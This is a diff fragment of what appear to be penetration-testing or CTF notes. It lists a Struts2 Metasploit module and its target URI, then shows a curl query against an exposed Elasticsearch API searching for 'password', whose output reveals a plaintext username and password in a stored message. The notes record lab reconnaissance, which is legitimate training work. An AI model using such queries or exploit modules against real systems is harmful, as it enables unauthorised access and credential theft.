@@ -37,4 +37,30 @@ sudo /sbin/reboot
 - OS: Microsoft Windows 2008| Vista | 7
 - exploit: multi/http/struts2_rest_xstream
 - Targeturi: /struts2-rest-showcase/orders/
-- 
+- Kibana
+- 5601 is the elastic search port, 9200 is the api
+````
+curl -X GET "10.10.15.175:9200/_search?q=password&pretty"                                                                                                                                                                  130 ⨯
+{
+  "took" : 11,
+  "timed_out" : false,
+  "_shards" : {
+    "total" : 6,
+    "successful" : 6,
+    "skipped" : 0,
+    "failed" : 0
+  },
+  "hits" : {
+    "total" : 1,
+    "max_score" : 2.0136302,
+    "hits" : [
+      {
+        "_index" : "messages",
+        "_type" : "_doc",
+        "_id" : "73",
+        "_score" : 2.0136302,
+        "_source" : {
+          "sender" : "mary",
+          "receiver" : "wendy",
+          "message" : "hey, can you access my dev account for me. My username is l33tperson and my password is 9Qs58Ol3AXkMWLxiEyUyyf"
+````
